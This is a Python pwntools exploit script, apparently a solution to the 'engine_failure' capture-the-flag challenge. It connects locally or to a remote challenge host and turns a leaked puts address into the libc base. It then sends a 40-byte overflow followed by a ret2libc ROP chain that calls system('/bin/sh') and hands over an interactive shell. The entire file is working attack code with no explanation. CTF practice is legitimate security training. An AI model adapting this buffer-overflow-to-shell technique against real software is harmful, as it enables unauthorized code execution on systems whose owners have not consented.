from pwn import *
binary = './engine_failure.bin'#args.BIN
e = context.binary = ELF(binary,checksec=False)
log.info('Discovering gadgets for binary')
r = ROP(e)

libc = ELF('./libc.so.6',checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
rlibc = ROP(libc)

def start():
    if args.GDB:
        return gdb.debug(e.path)
    if args.REMOTE:
        return remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")    
    else:
        return process(e.path)

p = start()
p.sendline(b'2')
p.recvuntil(b'Coordinates: ')

leak = int(p.recvuntil(b'\n'),16)
log.info('puts leak is at 0x%x' %leak)

libc.address = leak - libc.sym["puts"]

log.info('libc base address is at 0x%x' %libc.address)


pop_rdi = rlibc.find_gadget(['pop rdi','ret'])[0]
pop_libc = pop_rdi + libc.address
system = libc.sym['system']
log.info('system is at 0x%x' %system)
log.info('libcbase+system is at 0x%x' %(libc.address+system))
bin_sh = next(libc.search(b'/bin/sh'))
log.info('Pop RDI is at 0x%x' %pop_rdi)
log.info('Pop RDI +libc is at 0x%x' %pop_libc)
log.info('System is at 0x%x' %system)
log.info('/bin/sh is at 0x%x' %bin_sh)

chain = p64(pop_libc+1)  
chain += p64(pop_libc)
chain += p64(bin_sh)
chain += p64(system)

pad = b'A'*40

p.sendline(b'1')
p.sendline(b'1')
p.recvuntil(b'>>>')
p.sendline(pad+chain)
p.interactive()
